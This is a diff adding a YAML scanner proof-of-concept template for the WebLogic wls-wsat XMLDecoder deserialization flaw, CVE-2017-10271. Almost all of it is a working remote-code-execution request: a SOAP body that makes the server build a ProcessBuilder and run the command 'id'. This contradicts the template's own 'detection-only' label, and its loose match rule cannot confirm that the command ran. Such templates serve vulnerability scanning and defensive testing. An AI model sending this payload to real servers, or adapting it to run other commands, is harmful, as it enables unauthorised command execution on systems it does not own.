@@ -1,0 +1,19 @@
+name: poc-weblogic-deserial
+transport: http
+set:
+  r0: randomLowercase(6)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/wls-wsat/CoordinatorPortType"
+      headers:
+        Content-Type: "text/xml"
+      body: '<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8" class="java.beans.XMLDecoder"><void id="x" property="class"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>id</string></void></array><void method="start"/></object></void></java></work:WorkContext></soapenv:Header></soapenv:Envelope>'
+    expression: response.status == 500 || response.body.bcontains("weblogic") || response.body.bcontains("XMLDecoder")
+expression: r0()
+detail:
+  author: sxel
+  description: WebLogic wls-wsat XMLDecoder RCE probe (CVE-2017-10271, detection-only)
+  severity: critical
+  tags: weblogic,java,rce,xmldecoder
